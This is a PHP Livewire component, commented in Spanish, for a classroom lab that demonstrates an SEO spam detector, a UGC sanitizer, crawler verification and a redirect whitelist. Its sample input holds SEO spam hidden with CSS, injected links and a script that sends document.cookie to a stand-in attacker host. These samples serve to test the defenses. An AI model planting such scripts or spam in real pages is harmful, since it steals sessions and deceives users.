<?php

declare(strict_types=1);

namespace App\Livewire\Seo;

use App\Services\Seo\DetectorSpamSeo;
use App\Services\Seo\RedireccionSegura;
use App\Services\Seo\SanitizadorUgc;
use App\Services\Seo\VerificadorCrawler;
use Flux\Flux;
use Illuminate\Support\Facades\Auth;
use Illuminate\View\View;
use Livewire\Attributes\Computed;
use Livewire\Component;

/**
 * Banco de pruebas de los tres controles preventivos, para usarse en vivo.
 *
 * Existe porque un control que solo se puede enseñar leyendo el código no se puede defender
 * en una presentación de tres minutos. Aquí se pega el ataque, se pulsa un botón y se ve la
 * reacción: qué sobrevive a la limpieza, cuántos puntos de anomalía suma y por qué la
 * verificación inversa del rastreador falla en el paso 1 o en el paso 2.
 *
 * Analizar NO registra incidentes: el analista tiene que poder probar cargas sin ensuciar el
 * histórico. Los dos botones que sí registran están marcados en la pantalla, porque son los
 * que simulan el ataque de verdad.
 */
class LaboratorioContenido extends Component
{
    public string $contenido = '';

    public string $ipRastreador = '';

    public string $agenteRastreador = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';

    public string $claveRedireccion = '';

    /** @var array<string, mixed>|null */
    public ?array $veredictoRastreador = null;

    public ?string $destinoResuelto = null;

    public bool $publicado = false;

    public function mount(): void
    {
        // Carga de ejemplo: la reseña típica de una campaña de inyección de enlaces.
        // Lleva vocabulario de farmacia, tres enlaces, un acortador y texto oculto por CSS.
        $this->contenido = '<p>Excelente producto, lo recomiendo.</p>'
            ."\n".'<p style="display:none">comprar viagra sin receta farmacia online barata</p>'
            ."\n".'<p>Visita <a href="https://bit.ly/oferta-2026">esta oferta</a>, '
            .'<a href="https://casino-premios.xyz">casino premios</a> y '
            .'<a href="https://prestamos-rapidos.top">prestamos rapidos sin buro</a>.</p>'
            ."\n".'<script>fetch("https://sitio-del-atacante.tld/robo?c="+document.cookie)</script>';

        $this->ipRastreador = (string) request()->ip();
    }

    /**
     * Resultado de limpiar y puntuar. Es una propiedad calculada y no una acción porque el
     * campo se escribe en vivo: el profesor teclea y la pantalla responde.
     *
     * @return array{html: string, puntuacion: int, publicable: bool, motivos: array<int, array{regla: string, descripcion: string, puntos: int, evidencia: string}>, enlaces: array<int, string>}
     */
    #[Computed]
    public function analisis(): array
    {
        $sanitizador = app(SanitizadorUgc::class);
        $detector = app(DetectorSpamSeo::class);

        $veredicto = $detector->analizar($this->contenido);

        return [
            'html' => $sanitizador->limpiar($this->contenido),
            'puntuacion' => $veredicto['puntuacion'],
            'publicable' => $veredicto['publicable'],
            'motivos' => $veredicto['motivos'],
            'enlaces' => $veredicto['enlaces'],
        ];
    }

    /**
     * Simula el envío real de la reseña: si el contenido supera el umbral, queda retenido y
     * se registra el incidente que aparecerá en el panel y en la bitácora del SIEM.
     */
    public function intentarPublicar(SanitizadorUgc $sanitizador): void
    {
        abort_unless(Auth::check(), 403);

        $resultado = $sanitizador->procesar($this->contenido, [
            'ip' => request()->ip(),
            'agente_usuario' => request()->userAgent(),
            'ruta' => request()->path(),
            'usuario_id' => Auth::id(),
            'origen' => 'laboratorio de contenido',
        ]);

        $this->publicado = $resultado['publicable'];

        Flux::toast(
            variant: $resultado['publicable'] ? 'success' : 'danger',
            text: $resultado['publicable']
                ? 'Publicado. Los enlaces salieron con rel="nofollow ugc noopener noreferrer".'
                : 'Retenido para revisión: '.$resultado['puntuacion'].' puntos de anomalía. Incidente registrado.',
        );
    }

    /**
     * Verificación inversa en vivo. No registra incidente: es una consulta, no un ataque.
     */
    public function verificarRastreador(VerificadorCrawler $verificador): void
    {
        abort_unless(Auth::check(), 403);

        $this->veredictoRastreador = $verificador->verificar(
            trim($this->ipRastreador),
            $this->agenteRastreador,
        );
    }

    /**
     * Prueba de la lista blanca de redirección. Esta sí registra incidente cuando la clave
     * no existe, porque es exactamente lo que haría un atacante probando el parámetro.
     */
    public function probarRedireccion(RedireccionSegura $redireccion): void
    {
        abort_unless(Auth::check(), 403);

        $this->destinoResuelto = $redireccion->resolver(
            $this->claveRedireccion,
            url('/'),
            [
                'ip' => request()->ip(),
                'agente_usuario' => request()->userAgent(),
                'ruta' => request()->path(),
                'usuario_id' => Auth::id(),
            ],
        );
    }

    /**
     * @return array<string, array{url: string, descripcion: string}>
     */
    #[Computed]
    public function destinosPermitidos(): array
    {
        return app(RedireccionSegura::class)->destinos();
    }

    public function render(): View
    {
        return view('livewire.seo.laboratorio-contenido');
    }
}
